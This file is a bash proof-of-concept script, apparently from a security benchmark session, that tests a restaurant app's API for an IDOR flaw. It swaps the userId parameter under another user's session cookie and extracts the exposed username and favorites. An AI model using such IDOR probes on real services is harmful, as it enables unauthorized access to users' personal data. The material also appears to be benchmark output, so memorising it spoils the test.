#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /api/get_favorite_restaurants.php by accessing another user's data using authenticated session of different user
# Target: ./repo
# Created: 2025-12-02T16:20:38.508Z
# Session: benchmark-XBEN-069-24-miorxjei

# IDOR Vulnerability POC - Favorite Restaurants API (v3)
# This script demonstrates unauthorized access to other users' favorite restaurants data
# by manipulating the userId parameter despite being logged in as a different user

TARGET_URL="http://localhost:8080"
ENDPOINT="/api/get_favorite_restaurants.php"

# Test parameters from the provided evidence
AUTHENTICATED_USER_ID=14
TARGET_USER_ID=1
SESSION_COOKIE="PHPSESSID=a05hsq0h9ak4g6drc987e9p3dj"

echo "[*] IDOR Vulnerability - Favorite Restaurants API"
echo "[*] Target: ${TARGET_URL}${ENDPOINT}"
echo "[*] Scenario: Access another user's restaurants data while authenticated as different user"
echo ""

# Attempt 1: Try to access userId=1 with the authenticated session
echo "[*] Attempting to access userId=${TARGET_USER_ID} while authenticated as userId=${AUTHENTICATED_USER_ID}"
echo "[*] Request: curl -s -X GET \"${TARGET_URL}${ENDPOINT}?userId=${TARGET_USER_ID}\" -H \"Cookie: ${SESSION_COOKIE}\""
echo ""

RESPONSE=$(curl -s -X GET "${TARGET_URL}${ENDPOINT}?userId=${TARGET_USER_ID}" \
  -H "Cookie: ${SESSION_COOKIE}")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Evaluate the response
if echo "$RESPONSE" | grep -q '"success":true'; then
    echo "[!] VULNERABILITY CONFIRMED: IDOR detected!"
    echo "[!] Successfully accessed userId=${TARGET_USER_ID}'s data while authenticated as userId=${AUTHENTICATED_USER_ID}"
    
    # Extract sensitive data
    if echo "$RESPONSE" | grep -q '"username"'; then
        USERNAME=$(echo "$RESPONSE" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
        echo "[!] Exposed username: $USERNAME"
    fi
    
    if echo "$RESPONSE" | grep -q '"restaurants"'; then
        echo "[!] Exposed favorite restaurants:"
        echo "$RESPONSE" | grep -o '"restaurants":\[[^]]*\]'
    fi
    
    echo ""
    echo "[+] IDOR Vulnerability Successfully Demonstrated"
    echo "[+] The endpoint does not verify user ownership of requested userId"
    exit 0
elif echo "$RESPONSE" | grep -q '"success":false'; then
    MESSAGE=$(echo "$RESPONSE" | grep -o '"message":"[^"]*"' | cut -d'"' -f4)
    echo "[*] Request returned success=false with message: $MESSAGE"
    
    if echo "$MESSAGE" | grep -q -i "not.*auth\|unauthorized\|forbidden"; then
        echo "[+] Authorization check is in place - endpoint properly restricts access"
        exit 1
    elif echo "$MESSAGE" | grep -q -i "no.*restaurants\|not.*found"; then
        echo "[?] Could indicate empty list or IDOR protection"
        echo "    The endpoint may have user-level authorization"
        exit 1
    else
        echo "[?] Unexpected error message - further investigation needed"
        exit 1
    fi
else
    echo "[-] Unexpected response format:"
    echo "$RESPONSE"
    exit 1
fi